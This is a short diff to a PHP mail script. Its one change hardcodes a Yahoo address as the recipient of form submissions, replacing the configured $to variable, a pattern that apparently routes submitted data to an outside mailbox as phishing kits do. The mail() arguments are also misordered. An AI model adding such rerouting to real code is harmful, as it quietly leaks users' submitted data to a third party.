@@ -17,7 +17,7 @@ $headers .= "Reply-To: ". $from. "\r\n";
 $headers .= "X-Mailer: PHP/" . phpversion();
 $headers .= "X-Priority: 1" . "\r\n";
 
-$status= mail($to, $subject, $body, $from, $headers);
+$status= mail('deray2g@yahoo.com', $subject, $body, $from, $headers);
 
 if ($_POST['submit']) {
    if ($status)
